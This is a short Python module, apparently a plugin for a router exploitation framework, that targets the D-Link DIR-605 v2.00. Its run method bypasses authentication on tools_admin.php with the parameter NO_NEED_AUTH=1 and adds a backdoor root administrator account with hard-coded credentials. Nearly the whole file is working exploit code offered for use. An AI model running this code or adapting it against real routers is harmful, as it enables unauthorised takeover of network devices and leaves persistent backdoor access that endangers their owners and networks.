import urllib
import util
from ..router_vuln import RouterVuln

__router__ = 'DIR-605 v2.00'
__vuln__='Backdoor Root'
class Backdoor(RouterVuln):
	""" Adds a backdoor root account to the router
		http://www.exploit-db.com/exploits/18638/
	"""
	def __init__(self):
		super(Backdoor,self).__init__()

	def run(self):
		util.Msg('Adding admin \'adm4n\' with password \'d3fault\'')
		url = 'http://%s/tools_admin.php?NO_NEED_AUTH=1&AUTH_GROUP=0'%self.ip
		params = urllib.urlencode({'ACTION_POST':1, 'admin_name':'adm4n','admin_password':'d3fault',
						 	       'admin_password2':'d3fault'})
		try:
			response = urllib.urlopen(url,params).read()
			util.Msg('Done.  Connect to %s with \'adm4n:d3fault\''%self.ip)
		except Exception, e:
			util.Error('Failed: %s'%e)
			return
